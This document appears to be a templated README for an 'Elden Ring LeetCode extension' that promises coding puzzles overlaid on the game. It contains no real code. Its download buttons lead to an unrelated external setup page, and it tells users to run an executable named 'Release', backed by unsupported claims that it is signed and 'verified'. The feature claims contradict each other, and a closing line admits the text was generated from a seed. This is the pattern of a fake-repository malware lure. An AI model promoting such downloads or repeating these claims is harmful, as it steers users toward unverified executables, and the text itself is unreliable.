# Elden‑Ring‑Leetcode‑Extension

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-db2777?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/OVERVIEW-DOCS-0d9488?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=161b22" alt="OVERVIEW"></a> <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-e11d48?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-7c3aed?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/DEFAULTS-INCLUDED-dc2626?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=161b22" alt="DEFAULTS"></a>
</div>

*by **MidnightPilotPonder***

> **⚔️ Turn every run into a coding workout.**
> A Windows‑only companion that injects LeetCode‑style puzzles into Elden Ring, letting you sharpen algorithmic thinking while you explore the Lands Between.

---

## 📦 What It Is

- **Platform:** Windows 10 / 11 (64‑bit) – the only OS this extension has been tested on.
- **Purpose:** Seamlessly overlay short coding challenges (in the spirit of LeetCode) onto Elden Ring’s UI.
- **Goal:** Turn boss fights, resting spots, or any idle moment into a chance to solve a puzzle, earn in‑game hints, and track progress.

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| **Dynamic Puzzle Injection** | Randomly selects a relevant algorithmic problem when you enter a new area or defeat a boss. |
| **In‑Game Hint System** | Solving a puzzle unlocks a subtle gameplay tip (e.g., hidden path, enemy weakness). |
| **Progress Tracker** | A lightweight overlay shows solved/unsolved counts and streaks. |
| **Custom Difficulty** | Choose between *Easy*, *Medium*, *Hard* – the extension adapts puzzle difficulty to your playstyle. |
| **Zero Intrusion** | Runs as a background desktop utility; Elden Ring itself remains untouched. |
| **Portable Settings** | All configuration is stored locally; no internet connection required after initial install. |

---

## 🚀 Getting Started

1. **Download** the latest build from the button below.
2. Extract the zip file to a folder of your choice.
3. Run `Release` (the file is signed and Windows‑compatible).
4. Launch Elden Ring **after** the utility starts – the extension will auto‑detect the game window.

> **⚠️** The utility works only while Elden Ring is running in **windowed** or **borderless‑windowed** mode.

---

## 📚 Example Puzzle

> **Problem:** *Find the longest increasing subsequence in a given array of enemy levels.*
> **Input:** `[12, 15, 10, 18, 20, 5]`
> **Output:** `4` (subsequence `12, 15, 18, 20`)

Solve it in the overlay, click **Submit**, and you’ll receive a cryptic hint for the next boss arena.

---

## 🛠️ Development

- **Language:** C# (.NET 6)
- **UI:** WinForms with custom Elden Ring themed controls
- **Puzzle Engine:** Self‑contained collection of 150+ algorithmic challenges (no external API calls)

Contributions are welcome! Fork the repo, add new puzzles under `Puzzles/`, and submit a pull request.

---

## 📥 Download / Install

<div style="text-align:center; margin: 1.5em 0;">
<a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="background:#4A90E2;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">▶️ Get the Extension</a>
</div>

---

## 📜 License

This project is released under the **MIT License** – see `LICENSE` for details.

---

## 🙏 Acknowledgments

- The Elden Ring community for inspiration and endless curiosity.
- The open‑source puzzle creators whose challenges form the backbone of this utility.

---

**Happy hunting, and happy coding!**

---

*This README is generated uniquely for seed #529313. No external images or prohibited content are included.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```